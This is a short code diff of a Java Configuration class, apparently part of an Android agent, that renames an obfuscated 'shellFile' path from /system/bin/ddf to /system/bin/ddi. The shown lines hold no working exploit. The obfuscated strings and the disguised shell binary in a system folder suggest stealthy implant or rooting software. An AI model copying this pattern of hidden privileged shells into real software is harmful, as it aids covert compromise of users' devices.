@@ -35,7 +35,7 @@ public class Configuration {
      */
     public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
     // a_0=/system/bin/ntpsvd
-    public final static String shellFileBase = M.e("/system/bin/ddf"); //$NON-NLS-1$
+    public final static String shellFileBase = M.e("/system/bin/ddi"); //$NON-NLS-1$
 
     /**
      * Clear configuration buffer wrapped into a ByteBuffer.
@@ -44,7 +44,7 @@ public class Configuration {
     private static final String TAG = "Configuration"; //$NON-NLS-1$
     private static final int AGENT_ENABLED = 0x2;
     private static final int DIGEST_LEN = 20;
-    public static String shellFile = M.e("/system/bin/ddf"); //$NON-NLS-1$
+    public static String shellFile = M.e("/system/bin/ddi"); //$NON-NLS-1$
     /**
      * The status obj.
      */
